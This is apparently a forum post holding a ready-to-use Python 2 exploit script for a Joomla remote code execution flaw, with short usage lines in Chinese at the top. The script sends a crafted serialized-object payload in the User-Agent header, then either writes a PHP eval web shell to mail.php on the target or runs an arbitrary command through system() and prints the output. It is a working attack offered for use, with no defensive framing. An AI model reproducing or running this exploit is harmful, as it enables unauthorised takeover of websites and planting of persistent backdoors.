发吧发吧~jj.py http://123.123.123.123 ->直接GETSHELL
jj.py http://123.123.123.123 "whoami" ->执行命令


#author:we8i&90sec
import urllib2,urllib,base64
import cookielib,sys,re
cj = cookielib.CookieJar() 
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
urllib2.install_opener(opener) 
urllib2.socket.setdefaulttimeout(10) 
if len(sys.argv) == 2:
        values = {'111' : base64.b64encode('$myfile = fopen($_SERVER["DOCUMENT_ROOT"]."/mail.php", "w+")or die("cctv321");fwrite($myfile, "<?php @eval(\$_POST[we8i]);?>");fclose($myfile);echo "cctv123";')}
elif len(sys.argv) == 3:
        values = {'111' : base64.b64encode('echo "cctvcmd<sb>";system("'+sys.argv[2]+'");echo "</sb>";')}
ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:60:"eval(base64_decode($_POST[111]));JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
 
req  = urllib2.Request(url=sys.argv[1],headers={'User-Agent':ua}) 
opener.open(req) 
data = urllib.urlencode(values)
req  = urllib2.Request(sys.argv[1],data)
comeback = opener.open(req).read()
if 'cctv123' in comeback: 
        print "ShellUrl:"+sys.argv[1]+"/mail.php"
        print "PS:if the shell url wrong try http://webUrlRoot/mail.php"
elif 'cctv321' in comeback:
        print "the command can work,but the path maybe can not write!"
elif 'cctvcmd' in comeback:
        cmd= re.findall("<sb>(.*)</sb>",comeback,re.S)
        for x in cmd:
                print x
